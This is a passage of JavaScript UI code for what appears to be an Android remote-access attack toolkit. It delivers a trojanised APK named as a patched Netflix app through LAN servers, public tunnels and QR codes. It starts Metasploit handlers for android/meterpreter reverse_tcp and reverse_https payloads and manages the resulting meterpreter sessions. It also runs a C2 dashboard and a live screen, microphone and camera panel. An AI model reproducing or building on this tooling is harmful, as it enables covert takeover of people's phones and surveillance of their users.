  const apk = _pdBuiltApk || document.getElementById('pd-apk-path')?.value?.trim() || '';
  if (!ip || !apk) { showToast('Need IP and APK', 'disconnect', 2000); return; }
  fetch('/api/adb',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({args:['-s', ip, 'install','-r', apk]})
  }).then(r=>r.json()).then(d => {
    const ok = (d.output||'').includes('Success');
    showToast(ok ? 'Network install OK' : 'Failed: ' + d.output.slice(0,60), ok?'connect':'disconnect', 4000);
    pdDeliverLog((ok?'✓ ':'✗ ') + (d.output||d.error||''));
  });
}

// ── LAN serve / WAN expose (fire via backend ops) ────────────────────────────
function pdRunOp(op) {
  const serial = document.getElementById('dev-select').value;
  const lhost  = document.getElementById('pd-lhost').value.trim() || settings.lhost || '';
  const lport  = document.getElementById('pd-lport').value.trim() || '4444';
  const params = { operation: op, lhost, lport,
    apk_path: _pdBuiltApk || document.getElementById('pd-apk-path')?.value?.trim() || '',
    port: document.getElementById('pd-lan-port')?.value || '8891'
  };
  fetch('/api/run',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({target:serial, params})
  }).then(r=>r.json()).then(d => {
    if (d.session_id) showToast('Op started: session #' + d.session_id, 'info', 2000);
    else showToast(d.error||'Started', 'info', 2000);
  });
}

function pdWanExpose() {
  const serial  = document.getElementById('dev-select').value;
  const lhost   = document.getElementById('pd-lhost').value.trim() || settings.lhost || '';
  const lport   = document.getElementById('pd-lport').value.trim() || '4444';
  const tunnel  = document.getElementById('pd-tunnel').value;
  const port    = document.getElementById('pd-wan-port').value || '8891';
  const apkPath = _pdBuiltApk || document.getElementById('pd-apk-path')?.value?.trim() || '';
  const tunnelMap = { lhr:'localhost_run', bore:'bore', cloudflared:'cloudflared' };
  const params = { operation:'wan_expose', lhost, lport, tunnel: tunnelMap[tunnel]||'localhost_run',
    apk_server_port: port, apk_path: apkPath };
  fetch('/api/run',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({target:serial, params})
  }).then(r=>r.json()).then(d => {
    if (d.session_id) {
      _pdWanActive = true;
      showToast('WAN expose started — watch P&D → QR tab', 'connect', 3000);
      watchSession(d.session_id, pdRefreshWanUrl, pdDeliverLog);
    } else showToast(d.error||'WAN expose error', 'disconnect', 3000);
  });
}
function pdWanStop() {
  fetch('/api/kill',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}' })
    .then(() => { _pdWanActive = false; showToast('Tunnel stop signal sent', 'info', 2000); });
}
function pdRefreshWanUrl() {
  const urlEl = document.getElementById('pd-wan-url');
  const copyRow = document.getElementById('pd-wan-copy-row');
  const lastUrl = _lastResult?.data?.findings?.find(f => f.category==='wan_expose')?.apk_download_url || '';
  if (lastUrl && urlEl) {
    urlEl.textContent = lastUrl;
    urlEl.style.display = 'block';
    if (copyRow) copyRow.style.display = 'flex';
    pdNav('qr');
    pdRefreshQRView();
  }
}

// ── Start MSF handler ─────────────────────────────────────────────────────────
function pdStartHandler() {
  const lhost = document.getElementById('pd-lhost')?.value?.trim() || settings.lhost || '';
  const lport = document.getElementById('pd-lport')?.value?.trim() || '4444';
  const ptype = document.getElementById('pd-payload')?.value || 'tcp';
  const payloadMap = {tcp:'android/meterpreter/reverse_tcp',http:'android/meterpreter/reverse_http',
    https:'android/meterpreter/reverse_https',bind:'android/meterpreter/bind_tcp'};
  const payload = payloadMap[ptype] || 'android/meterpreter/reverse_tcp';
  if (!lhost) { showToast('Set LHOST first', 'disconnect', 2500); return; }
  const initCmd = `use exploit/multi/handler; set PAYLOAD ${payload}; set LHOST ${lhost}; set LPORT ${lport}; set ExitOnSession false; run -j`;
  fetch('/api/msf/start',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({init: initCmd})
  }).then(r=>r.json()).then(d => {
    if (d.ok) {
      connectMsfSSE();
      setMsfStatus(true);
      setMsfStatus2(true);
      showToast('Handler started: ' + payload + ' ' + lhost + ':' + lport, 'connect', 3500);
      const b = document.getElementById('msf-badge');
      if (b) { b.textContent = '●'; b.style.display = 'inline'; }
    } else showToast('MSF start failed: ' + (d.error||''), 'disconnect', 4000);
  });
}

// ── copy text helpers ──────────────────────────────────────────────────────────
function pdCopyEl(elId) {
  const el = document.getElementById(elId);
  if (el) copyText(el.textContent.trim());
}
function pdUpdateSite() {
  const url = document.getElementById('pd-wan-url')?.textContent?.trim() || '';
  if (!url) { showToast('No WAN URL yet', 'disconnect', 2000); return; }
  showToast('Update /tmp/apksite/index.html manually: APK_URL = \'' + url + '\'', 'info', 6000);
}

// ── QR generation ─────────────────────────────────────────────────────────────
function pdGenQR(mode) {
  const apk = _pdBuiltApk || document.getElementById('pd-apk-path')?.value?.trim() || '';
  let baseUrl = '';
  if (mode === 'wan') baseUrl = document.getElementById('pd-wan-url')?.textContent?.trim() || '';
  if (mode === 'lan') {
    const lh = settings.lhost || '192.168.1.1';
    const lp = document.getElementById('pd-lan-port')?.value || '8891';
    baseUrl = 'http://' + lh + ':' + lp;
  }
  const serial = document.getElementById('dev-select').value;
  const params = { operation:'qr_exploit', mode: mode === 'wan' ? 'wan' : 'apk_url',
    apk_url: baseUrl + '/Netflix_patched.apk', site_url: baseUrl };
  fetch('/api/run',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({target:serial, params})
  }).then(r=>r.json()).then(d => {
    showToast('QR generation started', 'info', 2000);
    if (d.session_id) watchSession(d.session_id, pdRefreshQRView, txt => {});
  });
}

function pdRefreshQRView() {
  const area = document.getElementById('pdv-qr-area');
  if (!area) return;
  const fArr = _lastResult?.data?.findings || [];
  const wanF = fArr.find(f => f.category === 'wan_expose');
  const bkdF = fArr.find(f => ['backdoor_apk','deploy_shell'].includes(f.category));
  let html = '';
  if (wanF?.apk_download_url) {
    html += `<div class="pd-qr-card">
      <div class="pd-sect-hdr" style="margin-bottom:6px">APK Download URL</div>
      <div class="pd-url-box">${esc(wanF.apk_download_url)}</div>
      <div class="pd-act-row">
        <button class="pd-btn accent" onclick="copyText('${esc(wanF.apk_download_url)}')">copy</button>
        <a class="pd-btn" href="${esc(wanF.apk_download_url)}" target="_blank" style="text-decoration:none">open ↗</a>
      </div>
    </div>`;
  }
  if (wanF?.msf_tunnel_url) {
    html += `<div class="pd-qr-card">
      <div class="pd-sect-hdr" style="margin-bottom:6px">MSF Tunnel</div>
      <div class="pd-url-box">${esc(wanF.msf_tunnel_url)}</div>
      <button class="pd-btn" onclick="copyText('${esc(wanF.msf_tunnel_url)}')">copy</button>
    </div>`;
  }
  // captured QR from terminal
  for (const q of qrList) {
    if (q.startsWith('URL:')) {
      const url = q.replace(/^URL:\s*/,'').trim();
      html += `<div class="pd-qr-card">
        <div class="pd-sect-hdr" style="margin-bottom:6px">Delivery URL</div>
        <div class="pd-url-box">${esc(url)}</div>
        <button class="pd-btn" onclick="copyText('${esc(url)}')">copy</button>
      </div>`;
    } else {
      html += `<div class="pd-qr-card"><div class="pd-sect-hdr" style="margin-bottom:6px">QR Code</div><pre class="pd-qr-pre">${q.replace(/&/g,'&amp;').replace(/</g,'&lt;')}</pre></div>`;
    }
  }
  if (!html) html = '<div class="pd-info" style="flex:1">No delivery info yet — run WAN Expose or LAN Serve.</div>';
  area.innerHTML = html;

  // also update op log
  const logEl = document.getElementById('pdv-op-log');
  if (logEl && _lastResult?.data) {
    const d = _lastResult.data;
    logEl.textContent = JSON.stringify(d, null, 2);
  }
}

// ── deliver log helper ────────────────────────────────────────────────────────
function pdDeliverLog(txt) {
  const sect = document.getElementById('pd-deliver-log-sect');
  const logEl = document.getElementById('pd-deliver-log');
  if (!logEl) return;
  if (sect) sect.style.display = 'block';
  logEl.textContent += txt + '\n';
  logEl.scrollTop = logEl.scrollHeight;
}

// ── sessions in P&D panel ─────────────────────────────────────────────────────
function pdRefreshSessions() {
  const listEl = document.getElementById('pdv-secv-list');
  const sdList = document.getElementById('sd-secv-list');
  const all = Object.values(_activeSessions);
  const render = (el) => {
    if (!el) return;
    if (!all.length) { el.innerHTML = '<div class="pd-info">No active sessions.</div>'; return; }
    el.innerHTML = all.map(s => {
      const elapsed = Math.floor((Date.now() - s.startTs) / 1000);
      const icon = s.status === 'done' ? '✓' : s.status === 'error' ? '✗' : '…';
      return `<div class="pd-sess-row ${s.status === 'running' ? 'active-sess' : ''}">
        <div class="pd-sess-dot ${s.status === 'running' ? 'running' : ''}" style="background:${s.color}"></div>
        <div class="pd-sess-info">
          <div class="pd-sess-id">#${s.id} <span style="font-size:0.6rem;color:var(--accent);background:var(--accent-dim);padding:1px 5px">${s.op}</span> ${icon}</div>
          <div class="pd-sess-meta">${s.device||'no device'} · ${elapsed}s</div>
        </div>
        <div class="pd-sess-acts">
          <button class="pd-sa" onclick="switchTab('terminal')">log</button>
          <button class="pd-sa kill" onclick="killOp(${s.id})">×</button>
        </div>
      </div>`;
    }).join('');
  };
  render(listEl);

  // also update drawer
  if (sdList) {
    if (!all.length) { sdList.innerHTML = '<div style="color:var(--muted);font-size:0.65rem;">No sessions yet.</div>'; }
    else sdList.innerHTML = all.map(s => {
      const elapsed = Math.floor((Date.now() - s.startTs) / 1000);
      return `<div class="sd-row ${s.status==='running'?'active-sd':''}">
        <div class="sd-dot ${s.status==='running'?'running':''}" style="background:${s.color}"></div>
        <div class="sd-info">
          <div class="sd-top"><span class="sd-id">#${s.id}</span><span class="sd-op">${s.op}</span></div>
          <div class="sd-dev">${s.device||'no device'} · ${elapsed}s · ${s.status}</div>
        </div>
        <div class="sd-acts">
          <button class="sd-act" onclick="switchTab('terminal');closeSessionDrawer()">log</button>
          <button class="sd-act kill" onclick="killOp(${s.id})">×</button>
        </div>
      </div>`;
    }).join('');
  }
}

function pdRefreshMsfSessions() {
  fetch('/api/msf/sessions').then(r=>r.json()).then(d => {
    const listEl = document.getElementById('pdv-msf-list');
    const sdList = document.getElementById('sd-msf-list');
    const ctEl   = document.getElementById('msf2-sess-ct');
    const sess   = d.sessions || [];
    if (ctEl) ctEl.textContent = sess.length ? sess.length + ' session' + (sess.length>1?'s':'') : '';
    const render = (el) => {
      if (!el) return;
      if (!sess.length) { el.innerHTML = '<div class="pd-info">No MSF sessions active.</div>'; return; }
      el.innerHTML = sess.map(s => `<div class="pd-sess-row active-sess">
        <div class="pd-sess-dot" style="background:var(--green)"></div>
        <div class="pd-sess-info">
          <div class="pd-sess-id">Session ${s.id} <span style="font-size:0.6rem;color:var(--green)">METERPRETER</span></div>
          <div class="pd-sess-meta">${s.info||''} · ${s.type||''}</div>
        </div>
        <div class="pd-sess-acts">
          <button class="pd-sa accent" onclick="msfInteract(${s.id})">interact</button>
          <button class="pd-sa" onclick="msfSend('sessions -k ${s.id}')">kill</button>
        </div>
      </div>`).join('');
    };
    render(listEl);
    if (sdList) {
      if (!sess.length) sdList.innerHTML = '<div style="color:var(--muted);font-size:0.65rem;">No MSF sessions.</div>';
      else sdList.innerHTML = sess.map(s => `<div class="sd-row active-sd">
        <div class="sd-dot" style="background:var(--green)"></div>
        <div class="sd-info">
          <div class="sd-top"><span class="sd-id">Session ${s.id}</span><span class="sd-op" style="color:var(--green);background:rgba(76,175,80,0.1)">meterpreter</span></div>
          <div class="sd-dev">${s.info||''}</div>
        </div>
        <div class="sd-acts">
          <button class="sd-act" onclick="msfInteract(${s.id});closeSessionDrawer()">interact</button>
        </div>
      </div>`).join('');
    }
  }).catch(() => {});
}

function msfInteract(id) {
  switchTab('msf-console');
  setTimeout(() => msfSend2('sessions -i ' + id), 200);
}

function pdKillAll() {
  Object.values(_activeSessions).forEach(s => killOp(s.id));
  showToast('Kill signal sent to all sessions', 'disconnect', 2000);
  setTimeout(pdRefreshSessions, 1000);
}

// ── session drawer ────────────────────────────────────────────────────────────
function toggleSessionDrawer() {
  const drawer  = document.getElementById('sess-drawer');
  const overlay = document.getElementById('sess-drawer-overlay');
  const isOpen  = drawer.classList.contains('open');
  if (isOpen) { closeSessionDrawer(); }
  else {
    drawer.classList.add('open');
    overlay.classList.add('show');
    pdRefreshSessions();
    pdRefreshMsfSessions();
  }
}
function closeSessionDrawer() {
  document.getElementById('sess-drawer').classList.remove('open');
  document.getElementById('sess-drawer-overlay').classList.remove('show');
}

// ════════════════════════════════════════════════════════════════════════════
// MSF CONSOLE TAB (msf2 — mirrored from live panel MSF)
// ════════════════════════════════════════════════════════════════════════════
let _msf2Listening = false;
let _msf2History = [];
let _msf2HistIdx = -1;

function startMsfConsole() {
  const lhost = document.getElementById('pd-lhost')?.value?.trim() || settings.lhost || '';
  const lport = document.getElementById('pd-lport')?.value?.trim() || '4444';
  const init  = lhost ? `use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST ${lhost}; set LPORT ${lport}; set ExitOnSession false; run -j` : '';
  fetch('/api/msf/start',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({init})
  }).then(r=>r.json()).then(d => {
    if (d.ok) {
      connectMsfSSE();
      setMsfStatus(true);
      setMsfStatus2(true);
      showToast('msfconsole started', 'connect', 2500);
    } else showToast('MSF start failed: ' + (d.error||''), 'disconnect', 4000);
  });
}

function setMsfStatus2(on) {
  const dot = document.getElementById('msf2-dot');
  const st  = document.getElementById('msf2-status');
  const b   = document.getElementById('msf-badge');
  if (dot) { dot.className = on ? 'on' : ''; }
  if (st)  { st.textContent = on ? 'running' : 'offline'; st.className = on ? 'on' : ''; }
  if (b)   { b.textContent = on ? '●' : ''; b.style.display = on ? 'inline' : 'none'; }
}

function checkMsfStatus2() {
  fetch('/api/msf/sessions').then(r=>r.json()).then(d => {
    setMsfStatus2(d.running);
    if (d.running && !_msf2Listening) attachMsf2();
  }).catch(()=>{});
}

function attachMsf2() {
  _msf2Listening = true;
  if (_msfEs) { _msfEs.onmessage = (e) => { msfLine(e.data); msf2Line(e.data); }; }
}

function msf2Line(raw) {
  const term = document.getElementById('msf2-terminal');
  if (!term) return;
  const span = document.createElement('span');
  span.className = 'ln';
  span.innerHTML = ansiToHtml(raw) + '\n';
  term.appendChild(span);
  term.scrollTop = term.scrollHeight;
  // mirror session count
  const ctMatch = raw.match(/\[(\d+) sessions? opened/i);
  if (ctMatch) {
    const ctEl = document.getElementById('msf2-sess-ct');
    if (ctEl) ctEl.textContent = ctMatch[1] + ' session(s)';
  }
}

function msfSend2(cmd) {
  if (!cmd) return;
  fetch('/api/msf/send',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({cmd})
  }).then(r=>r.json()).catch(()=>{});
  msf2Line('\x1b[36mmsf6> ' + cmd + '\x1b[0m');
  msfLine('\x1b[36mmsf6> ' + cmd + '\x1b[0m');
}

function msf2Enter(e) {
  if (e.key === 'ArrowUp') {
    e.preventDefault();
    if (_msf2HistIdx < _msf2History.length - 1) {
      _msf2HistIdx++;
      e.target.value = _msf2History[_msf2History.length - 1 - _msf2HistIdx] || '';
    }
    return;
  }
  if (e.key === 'ArrowDown') {
    e.preventDefault();
    if (_msf2HistIdx > 0) {
      _msf2HistIdx--;
      e.target.value = _msf2History[_msf2History.length - 1 - _msf2HistIdx] || '';
    } else { _msf2HistIdx = -1; e.target.value = ''; }
    return;
  }
  if (e.key !== 'Enter') return;
  const cmd = e.target.value.trim();
  if (!cmd) return;
  e.target.value = '';
  _msf2History.push(cmd);
  _msf2HistIdx = -1;
  msfSend2(cmd);
}

function clearMsf2() {
  const t = document.getElementById('msf2-terminal'); if (t) t.innerHTML = '';
}

// ── Tabs ──────────────────────────────────────────────────────────────────────
function toggleSidebar() {
  const sb  = document.getElementById('sidebar');
  const btn = document.getElementById('sidebar-toggle-btn');
  const hidden = sb.classList.toggle('hidden');
  btn.classList.toggle('active', !hidden);
  try { localStorage.setItem('secv_sidebar_hidden', hidden ? '1' : '0'); } catch(e) {}
}

function switchTab(tab) {
  const names = ['terminal','adb','shell','findings','pd','msf-console','files','setup','c2','live'];
  document.querySelectorAll('.tab').forEach((t,i) => t.classList.toggle('active', names[i]===tab));
  // self-contained tabs get full height — hide the params panel
  const fullHeight = tab === 'pd' || tab === 'msf-console';
  const pp = document.getElementById('params-panel');
  if (pp) pp.style.display = fullHeight ? 'none' : '';
  document.getElementById('terminal-wrap').style.display      = tab==='terminal'    ? 'flex':'none';
  document.getElementById('adb-console').style.display        = tab==='adb'         ? 'flex':'none';
  document.getElementById('shell-panel').style.display        = tab==='shell'       ? 'flex':'none';
  document.getElementById('findings-panel').style.display     = tab==='findings'    ? 'flex':'none';
  document.getElementById('pd-panel').style.display           = tab==='pd'          ? 'flex':'none';
  document.getElementById('msf-console-panel').style.display  = tab==='msf-console' ? 'flex':'none';
  document.getElementById('files-panel').style.display        = tab==='files'       ? 'flex':'none';
  document.getElementById('setup-panel').style.display        = tab==='setup'       ? 'flex':'none';
  document.getElementById('c2-panel').style.display           = tab==='c2'          ? 'flex':'none';
  document.getElementById('live-panel').style.display         = tab==='live'        ? 'flex':'none';
  if (tab === 'shell' && !_ptyActive) startPty();
  if (tab === 'pd')          { pdRefreshSessions(); pdCheckApkStatus(); pdFormUpd(); }
  if (tab === 'msf-console') { checkMsfStatus2(); if (_msfEs && !_msf2Listening) attachMsf2(); }
  if (tab === 'files')       { loadFiles(); }
  if (tab === 'setup')       { loadDeps(); }
  if (tab === 'c2')          { checkC2Status(); }
  if (tab === 'live')        { onLiveTabOpen(); }
}

// ── ADB Console ───────────────────────────────────────────────────────────────
function adbEnter(e) {
  if (e.key !== 'Enter') return;
  const inp = document.getElementById('adb-input');
  const cmd = inp.value.trim(); if (!cmd) return;
  inp.value = '';
  const serial = document.getElementById('dev-select').value;
  const args = serial ? ['-s', serial, ...cmd.split(' ')] : cmd.split(' ');
  adbPrint(`\x1b[36madb ${args.join(' ')}\x1b[0m`);
  fetch('/api/adb', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({args})
  }).then(r => r.json()).then(d => adbPrint(d.output||''));
}
function adbPrint(line) {
  const out = document.getElementById('adb-output');
  const s = document.createElement('div');
  s.innerHTML = ansiToHtml(line); out.appendChild(s); out.scrollTop = out.scrollHeight;
}

// ── Devices ───────────────────────────────────────────────────────────────────
let _knownSerials  = new Set();   // track connected serials across polls
let _deviceMap     = {};          // serial → device info object
let _deviceWatchId = null;

function startDeviceWatch() {
  pollDevices();                               // immediate first poll
  _deviceWatchId = setInterval(pollDevices, 2000);
}

function pollDevices() {
  fetch('/api/devices').then(r => r.json()).then(d => {
    _applyDeviceList(d.devices || []);
  }).catch(() => {});
}

// ── shared device-list applier (used by poll + force reload) ──────────────────
function _applyDeviceList(devs) {
  const newMap = {};
  devs.forEach(dev => { newMap[dev.serial] = dev; });
  const newSet = new Set(Object.keys(newMap));
  const sel    = document.getElementById('dev-select');
  const curSel = sel.value;

  // ── detect connects ────────────────────────────────────────────
  for (const serial of newSet) {
    if (!_knownSerials.has(serial)) {
      const dev   = newMap[serial];
      const label = dev.label || serial;
      if (dev.status === 'unauthorized') {
        termLine(`\x1b[33m[!] Device detected but unauthorized: ${serial} — accept USB debugging on device\x1b[0m`);
        showToast(`Tap "Allow" on ${serial} to authorize USB`, 'info', 6000);
      } else {
        const aVer  = dev.android ? ` Android ${dev.android}` : '';
        termLine(`\x1b[32m[+] Device connected: ${label}${aVer} (${serial})\x1b[0m`);
        showToast(`Connected: ${label}${aVer}`, 'connect', 4000);
        if (!curSel) {
          sel.value = serial;
          _updateDevBadge(dev);
          appList = [];
          if (currentOp) renderParams(currentOp);
        }
      }
    }
  }

  // ── detect disconnects ─────────────────────────────────────────
  for (const serial of _knownSerials) {
    if (!newSet.has(serial)) {
      const label = (_deviceMap[serial] && _deviceMap[serial].label) || serial;
      termLine(`\x1b[31m[!] Device disconnected: ${label} (${serial})\x1b[0m`);
      showToast(`Disconnected: ${label}`, 'disconnect', 4000);
      if (curSel === serial) {
        document.getElementById('dev-name').textContent = 'no device';
        document.getElementById('dev-os').textContent   = '';
        document.getElementById('devbadge').classList.remove('connected');
        const remaining = devs.filter(x => x.serial !== serial);
        if (remaining.length) {
          sel.value = remaining[0].serial;
          _updateDevBadge(remaining[0]);
        } else {
          sel.value = '';
        }
      }
    }
  }

  // ── rebuild dropdown (virtualised — handles unlimited devices) ─
  _knownSerials = newSet;
  _deviceMap    = newMap;
  const prevSel = sel.value;

  // Use a DocumentFragment for O(n) DOM insertion regardless of device count
  const frag = document.createDocumentFragment();
  const placeholder = document.createElement('option');
  placeholder.value = ''; placeholder.textContent = '-- device --';
  frag.appendChild(placeholder);

  for (const dev of devs) {
    const o = document.createElement('option');
    o.value = dev.serial;
    if (dev.status === 'unauthorized') {
      o.textContent = `⚠ ${dev.serial} — tap Allow on device`;
      o.disabled    = true;
      o.style.color = '#e67828';
    } else {
      o.textContent = (dev.label || dev.serial) +
        (dev.android ? ' · Android '+dev.android : '') +
        (dev.sdk     ? ' (SDK '+dev.sdk+')'       : '');
    }
    if (dev.serial === prevSel) o.selected = true;
    frag.appendChild(o);
  }
  sel.innerHTML = '';
  sel.appendChild(frag);

  // ── update device count badge ──────────────────────────────────
  const cnt = devs.length;
  const cntEl = document.getElementById('dev-count');
  if (cntEl) cntEl.textContent = cnt ? `${cnt} device${cnt>1?'s':''}` : '';

  // ── sync badge ─────────────────────────────────────────────────
  if (prevSel && newMap[prevSel]) {
    _updateDevBadge(newMap[prevSel]);
  } else if (!prevSel || !newMap[prevSel]) {
    document.getElementById('devbadge').classList.remove('connected');
  }
}

function _updateDevBadge(dev) {
  const name = dev.label || dev.serial;
  const os   = dev.android
    ? 'Android ' + dev.android + (dev.sdk ? ' (SDK '+dev.sdk+')' : '')
    : (dev.tags || '');
  document.getElementById('dev-name').textContent = name;
  document.getElementById('dev-os').textContent   = os;
  document.getElementById('devbadge').classList.add('connected');
}

function refreshDevices() {
  // manual refresh: clear known state and re-poll immediately
  _knownSerials = new Set();
  _deviceMap    = {};
  pollDevices();
}

function forceReloadADB() {
  const btn = document.getElementById('reload-btn');
  btn.textContent = '… restarting';
  btn.disabled    = true;
  fetch('/api/devices/reload').then(r => r.json()).then(d => {
    btn.textContent = '⚡ reload adb';
    btn.disabled    = false;
    _knownSerials   = new Set();
    _deviceMap      = {};
    // process the fresh device list returned by reload
    _applyDeviceList(d.devices || []);
    termLine('\x1b[36m[i] ADB server restarted — device list refreshed\x1b[0m');
  }).catch(() => {
    btn.textContent = '⚡ reload adb';
    btn.disabled    = false;
    termLine('\x1b[31m[!] ADB reload failed\x1b[0m');
  });
}

function onDeviceChange() {
  const serial = document.getElementById('dev-select').value;
  if (serial && _deviceMap[serial]) {
    _updateDevBadge(_deviceMap[serial]);
  } else if (serial) {
    // fallback: fetch devinfo if not in cache
    fetch('/api/devinfo?serial='+encodeURIComponent(serial)).then(r => r.json()).then(d => {
      const dev = {
        serial,
        label:   (d['ro.product.brand']||'') + ' ' + (d['ro.product.model']||serial),
        android: d['ro.build.version.release']||'',
        sdk:     d['ro.build.version.sdk']||'',
      };
      _updateDevBadge(dev);
    });
  } else {
    document.getElementById('dev-name').textContent = 'no device';
    document.getElementById('dev-os').textContent   = '';
    document.getElementById('devbadge').classList.remove('connected');
  }
  appList = [];
  if (currentOp) renderParams(currentOp);
}

function loadDevInfo(serial) {
  if (_deviceMap[serial]) { _updateDevBadge(_deviceMap[serial]); return; }
  fetch('/api/devinfo?serial='+encodeURIComponent(serial)).then(r => r.json()).then(d => {
    document.getElementById('dev-name').textContent =
      (d['ro.product.brand']||'') + ' ' + (d['ro.product.model']||serial);
    document.getElementById('dev-os').textContent =
      'Android '+(d['ro.build.version.release']||'?')+
      ' (SDK '+(d['ro.build.version.sdk']||'?')+')';
    document.getElementById('devbadge').classList.add('connected');
  });
}

function loadAppList() {
  const serial = document.getElementById('dev-select').value;
  const url = '/api/applist' + (serial ? '?serial='+encodeURIComponent(serial) : '');
  fetch(url).then(r => r.json()).then(d => {
    appList = d.packages||[];
    termLine(`\x1b[32m[+] Loaded ${appList.length} apps\x1b[0m`);
    if (currentOp) renderParams(currentOp);
  });
}

// ── C2 Dashboard ──────────────────────────────────────────────────────────────
function getC2Port() { return parseInt(document.getElementById('c2-port-inp').value)||8891; }

function checkC2Status() {
  const port = getC2Port();
  fetch('/api/c2/status?port='+port).then(r => r.json()).then(d => {
    const badge = document.getElementById('c2-status-badge');
    const link  = document.getElementById('c2-open-link');
    if (d.running) {
      badge.textContent = '● :'+d.port; badge.style.color = 'var(--green)';
      showC2Frame(d.url); link.href = d.url; link.style.display = 'inline';
    } else {
      badge.textContent = '○ stopped'; badge.style.color = 'var(--muted)';
      link.style.display = 'none';
    }
  });
}

function showC2Frame(url) {
  const iframe = document.getElementById('c2-iframe');
  const ph     = document.getElementById('c2-placeholder');
  if (iframe.src !== url) iframe.src = url;
  ph.style.display = 'none'; iframe.style.display = 'block';
}

function launchC2() {
  const port = getC2Port();
  const badge = document.getElementById('c2-status-badge');
  badge.textContent = '… starting'; badge.style.color = 'var(--grey)';
  fetch('/api/c2/launch?port='+port).then(r => r.json()).then(d => {
    if (d.ok) {
      showC2Frame(d.url);
      document.getElementById('c2-open-link').href = d.url;
      document.getElementById('c2-open-link').style.display = 'inline';
      badge.textContent = '● :'+d.port; badge.style.color = 'var(--green)';
    } else {
      badge.textContent = '✗ failed'; badge.style.color = 'var(--red)';
    }
  });
}

function stopC2() {
  fetch('/api/c2/stop').then(() => {
    const iframe = document.getElementById('c2-iframe');
    iframe.src = ''; iframe.style.display = 'none';
    document.getElementById('c2-placeholder').style.display = 'flex';
    document.getElementById('c2-status-badge').textContent = '○ stopped';
    document.getElementById('c2-status-badge').style.color = 'var(--muted)';
    document.getElementById('c2-open-link').style.display = 'none';
  });
}

// ── Toast ─────────────────────────────────────────────────────────────────────
function showToast(msg, type='info', ms=3200) {
  const c = document.getElementById('toast-container');
  if (!c) return;
  const t = document.createElement('div');
  t.className = 'toast ' + type;
  t.textContent = msg;
  c.appendChild(t);
  setTimeout(() => {
    t.style.animation = 'toastOut .25s ease both';
    setTimeout(() => t.remove(), 260);
  }, ms);
}

// ── Status ────────────────────────────────────────────────────────────────────
function updateStatus() {
  const running = Object.values(_activeSessions).filter(s => s.status === 'running');
  const dot  = document.getElementById('status-dot');
  const txt  = document.getElementById('status-text');
  const kill = document.getElementById('kill-btn');
  const pb   = document.getElementById('progress-bar');
  if (running.length > 0) {
    dot.className = 'active';
    if (running.length === 1) {
      const s = running[0];
      txt.textContent = 'running: ' + s.op + (s.device ? ' ['+s.device+']' : '');
    } else {
      txt.textContent = running.length + ' running: ' + running.map(s=>s.op).join(', ');
    }
    kill.classList.add('active');
    if (pb) pb.classList.add('active');
  } else {
    dot.className = '';
    txt.textContent = 'idle';
    kill.classList.remove('active');
    if (pb) pb.classList.remove('active');
    opStartTs = null;
  }
}

function updateStatusTime() {
  const running = Object.values(_activeSessions).filter(s => s.status === 'running');
  const el = document.getElementById('status-time');
  if (running.length === 0) { el.textContent = ''; return; }
  const oldest = Math.min(...running.map(s => s.startTs));
  el.textContent = Math.floor((Date.now() - oldest) / 1000) + 's';
}

function killOp(sid) {
  const url = sid ? '/api/kill?session=' + sid : '/api/kill';
  fetch(url, {method:'POST'});
}

function updateSessionsBar() {
  const bar   = document.getElementById('sessions-bar');
  const label = document.getElementById('sess-label');
  const cnt   = document.getElementById('sess-count');
  const all   = Object.values(_activeSessions);
  if (all.length === 0) { bar.classList.remove('visible'); return; }
  bar.classList.add('visible');
  const running = all.filter(s => s.status === 'running');
  if (cnt) cnt.textContent = running.length ? running.length + ' running' : 'all done';

  // rebuild pills — preserve existing ones by sid to avoid flicker
  const existing = new Set([...bar.querySelectorAll('.sess-pill')].map(el => +el.dataset.sid));
  const current  = new Set(all.map(s => s.id));

  // remove stale pills
  bar.querySelectorAll('.sess-pill').forEach(el => {
    if (!current.has(+el.dataset.sid)) el.remove();
  });

  // add/update
  const frag = document.createDocumentFragment();
  all.forEach(s => {
    let pill = bar.querySelector('.sess-pill[data-sid="'+s.id+'"]');
    const elapsed = Math.floor((Date.now() - s.startTs) / 1000);
    if (!pill) {
      pill = document.createElement('div');
      pill.className = 'sess-pill ' + s.status;
      pill.dataset.sid = s.id;
      const statusIcon = s.status === 'done' ? '✓' : s.status === 'error' ? '✗' : '';
      pill.innerHTML =
        '<span class="sp-dot" style="background:'+s.color+'"></span>' +
        '<span class="sp-label">#'+s.id+'</span>' +
        '<span class="sp-op">'+s.op+'</span>' +
        (s.device ? '<span class="sp-dev">'+s.device.slice(0,12)+'</span>' : '') +
        '<span class="sp-time">'+elapsed+'s</span>' +
        (statusIcon ? '<span style="color:'+(s.status==='done'?'var(--green)':'var(--red)')+'">'+statusIcon+'</span>' : '') +
        '<button class="sp-kill" title="kill session" onclick="killOp('+s.id+')">×</button>';
      if (s.status === 'running') pill.querySelector('.sp-dot').classList.add('running');
      frag.appendChild(pill);
    } else {
      pill.className = 'sess-pill ' + s.status;
      const dot = pill.querySelector('.sp-dot');
      if (dot) {
        dot.style.background = s.color;
        dot.classList.toggle('running', s.status === 'running');
      }
      const timeEl = pill.querySelector('.sp-time');
      if (timeEl) timeEl.textContent = elapsed + 's';
    }
  });
  bar.appendChild(frag);
}

// ── Live Media ────────────────────────────────────────────────────────────────
let _screenActive  = false;
let _screenFpsTs   = 0;
let _screenFpsCnt  = 0;
let _micActive     = false;
let _micPollTimer  = null;
let _msfEs         = null;
let _speakerFile   = null;

function onLiveTabOpen() {
  const serial = document.getElementById('dev-select').value;
  if (_deviceMap[serial]) {
    const cam = document.getElementById('cam-id');
    if (cam.options.length < 2) cam.add(new Option('Front', '1'));
  }
  // auto-detect screen size if not yet known
  if (!_screenDims && serial) detectScreenSize();
  checkMsfStatus();
}

// ── Screen ────────────────────────────────────────────────────────────────────
let _screenDims      = null;   // {width, height} after detectScreenSize()
